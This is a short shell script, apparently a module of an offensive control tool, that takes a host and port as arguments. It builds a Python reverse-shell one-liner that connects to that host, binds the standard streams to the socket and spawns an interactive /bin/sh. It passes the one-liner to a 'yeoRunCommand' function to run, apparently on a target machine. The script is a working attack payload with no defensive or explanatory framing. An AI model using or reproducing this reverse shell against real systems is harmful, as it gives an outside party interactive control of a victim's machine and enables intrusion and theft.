source ../YeoMux_Control.sh
host=$1
port=$2

read -r -d '' cmd <<EOF 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF
yeoRunCommand "$cmd" 0
